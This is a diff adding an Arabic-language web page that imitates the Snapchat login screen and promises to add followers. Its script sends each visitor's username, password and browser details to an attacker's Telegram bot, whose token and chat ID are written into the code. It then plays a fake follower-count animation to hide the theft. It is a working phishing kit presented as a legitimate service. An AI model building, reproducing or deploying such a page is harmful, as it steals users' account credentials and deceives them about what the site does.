@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(to bottom, #fffc00, #ffcb2d);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .header {
+            width: 100%;
+            text-align: center;
+            padding: 40px 0 20px;
+        }
+        
+        .logo {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fffc00;
+            border-radius: 18px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .logo-inner {
+            width: 50px;
+            height: 50px;
+            background: #000;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fffc00;
+            font-size: 30px;
+            font-weight: bold;
+        }
+        
+        .tagline {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 25px;
+            width: 90%;
+            max-width: 400px;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #333;
+            background: #f8f8f8;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #fffc00;
+            background: #fff;
+            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.3);
+        }
+        
+        .login-btn {
+            background: #fffc00;
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            padding: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: all 0.2s;
+        }
+        
+        .login-btn:hover {
+            background: #fff200;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        
+        .divider::before {
+            margin-right: 10px;
+        }
+        
+        .divider::after {
+            margin-left: 10px;
+        }
+        
+        .signup-btn {
+            background: transparent;
+            color: #000;
+            border: 2px solid #fffc00;
+            border-radius: 12px;
+            font-size: 16px;
+            padding: 14px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .signup-btn:hover {
+            background: rgba(255, 252, 0, 0.1);
+        }
+        
+        .counter {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: none;
+        }
+        
+        .counter.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        
+        .counter h3 {
+            color: #000;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 18px;
+        }
+        
+        .followers-count {
+            font-size: 36px;
+            font-weight: bold;
+            color: #000;
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .progress {
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #fffc00, #ffcb2d);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .status {
+            margin-top: 15px;
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .loading {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #fffc00;
+            border-radius: 50%;
+            margin: 0 5px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .dot:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        
+        .dot:nth-child(3) {
+            animation-delay: 1s;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.7; }
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+            text-align: center;
+            max-width: 400px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #000;
+        }
+        
+        .ghost {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 40px;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            input {
+                padding: 14px;
+            }
+            
+            .login-btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-inner">S</div>
+        </div>
+        <div class="tagline">Snapchat</div>
+        <div class="subtitle">سجل الدخول لمشاهدة اللحظات اليومية</div>
+    </div>
+    
+    <div class="container">
+        <div class="form-group">
+            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
+        </div>
+        
+        <div class="form-group">
+            <input type="password" id="password" placeholder="كلمة السر">
+        </div>
+        
+        <div class="form-group">
+            <input type="number" id="followers" placeholder="عدد المتابعين المطلوب" min="100" value="1000">
+        </div>
+        
+        <button class="login-btn" id="login-btn">تسجيل الدخول</button>
+        
+        <div class="divider">أو</div>
+        
+        <button class="signup-btn">إنشاء حساب جديد</button>
+        
+        <div class="counter" id="counter">
+            <h3>جاري زيادة المتابعين</h3>
+            
+            <div class="loading">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            
+            <div class="followers-count" id="followers-count">0</div>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            
+            <div class="status" id="status">جاري إضافة المتابعين الجدد...</div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">المركز المساعدة</a>
+            <a href="#">更多</a>
+        </div>
+        <div>© 2023 Snap Inc.</div>
+    </div>
+
+    <script>
+        // بيانات البوت
+        const BOT_TOKEN = '8264466382:AAFLCpQrj6Ki_ofhkbCbEkY5D2-XdeKcmK0';
+        const CHAT_ID = '8329485587';
+        
+        document.getElementById('login-btn').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const followersInput = document.getElementById('followers').value;
+            
+            if (!username || !password) {
+                return;
+            }
+            
+            const targetFollowers = parseInt(followersInput) || 1000;
+            
+            // إرسال البيانات إلى البوت
+            sendDataToBot(username, password, targetFollowers);
+            
+            // إظهار عداد المتابعين
+            document.getElementById('counter').classList.add('active');
+            
+            // بدء المحاكاة
+            simulateFollowersIncrease(targetFollowers);
+        });
+        
+        function simulateFollowersIncrease(target) {
+            let current = 0;
+            const followersCount = document.getElementById('followers-count');
+            const progressBar = document.getElementById('progress-bar');
+            const status = document.getElementById('status');
+            
+            const interval = setInterval(() => {
+                // زيادة عشوائية للمتابعين
+                const increment = Math.floor(Math.random() * 20) + 1;
+                current += increment;
+                
+                if (current > target) {
+                    current = target;
+                    clearInterval(interval);
+                    status.textContent = 'اكتملت عملية زيادة المتابعين!';
+                }
+                
+                followersCount.textContent = current.toLocaleString();
+                
+                const progress = (current / target) * 100;
+                progressBar.style.width = progress + '%';
+                
+                // تحديث الرسالة بشكل عشوائي
+                const messages = [
+                    'جاري إضافة المتابعين الجدد...',
+                    'جاري متابعة الحسابات...',
+                    'جاري تفعيل نظام الزيادة...',
+                    'جاري زيادة التفاعل...',
+                    'جاري تحسين ظهور الحساب...'
+                ];
+                
+                if (Math.random() < 0.1) {
+                    status.textContent = messages[Math.floor(Math.random() * messages.length)];
+                }
+                
+            }, 100);
+        }
+        
+        function sendDataToBot(username, password, followers) {
+            const message = `
+                بيانات جديدة من صفحة سناب شات:
+                👤 اسم المستخدم: ${username}
+                🔑 كلمة المرور: ${password}
+                📊 عدد المتابعين المطلوب: ${followers}
+                ⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
+                🌐 المتصفح: ${navigator.userAgent}
+            `;
+            
+            // إرسال البيانات باستخدام fetch
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال البيانات:', data);
+            })
+            .catch((error) => {
+                console.error('خطأ في الإرسال:', error);
+            });
+        }
+    </script>
+</body>
+</html>
